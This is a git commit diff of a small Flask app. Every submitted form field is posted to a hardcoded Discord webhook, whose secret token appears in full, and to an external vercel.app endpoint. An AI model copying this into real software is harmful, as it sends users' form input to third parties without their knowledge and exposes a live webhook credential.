31b04299e358b6ff1465bece70369d864af15fc8
BuildTools <unconfigured@null.spigotmc.org>
2022-11-11 13:18:02 +0200

    added third web support

--- main.py
+++ main.py
@@ -7,26 +7,23 @@ app = Flask(__name__)
 @app.route("/", methods=['GET', 'POST'])
 def hello_world():
     async def send_info():
-<<<<<<< HEAD
-        a = request.form
-        print(a['name'])
-        for item, value in a.items():
-            for link in ['https://discord.com/api/webhooks/1038012726305366076/sr1YKbFZsi2t20YiuPubRFDFk3uHVyqeQ_zmIGiMxcZBKQc2pY5PDsN0LHufeI7dHUnM', ""]:
-                requests.post(link, data={"content": f"{item}:{value}"})
-    
-    if request.method == 'POST':
-        asyncio.run(send_info())
-=======
         global a
         a = request.form
         print(a['name'])
         for item, value in a.items():
-            requests.post("https://discord.com/api/webhooks/1038012726305366076/sr1YKbFZsi2t20YiuPubRFDFk3uHVyqeQ_zmIGiMxcZBKQc2pY5PDsN0LHufeI7dHUnM", data={"content": f"{item}:{value}"})
->>>>>>> c4b07e1290cc7112eec9b4825590b742d7321da1
+            for link in ['https://discord.com/api/webhooks/1038012726305366076/sr1YKbFZsi2t20YiuPubRFDFk3uHVyqeQ_zmIGiMxcZBKQc2pY5PDsN0LHufeI7dHUnM', "https://display-html.vercel.app/"]:
+                if "discord" in link:
+                    
+                    requests.post(link, data={"content": f"{item}:{value}"})
+                else:
+                    requests.post(link, data={item:value})
     
     if request.method == 'POST':
         asyncio.run(send_info())
+        return render_template('base.html', a=a)
     
-    return render_template('base.html', a=a)
+    
+    else:
+        return render_template('base.html', a=None)
 
 #changed lots of links MUST CHANGE BACK WHEN COMMITING
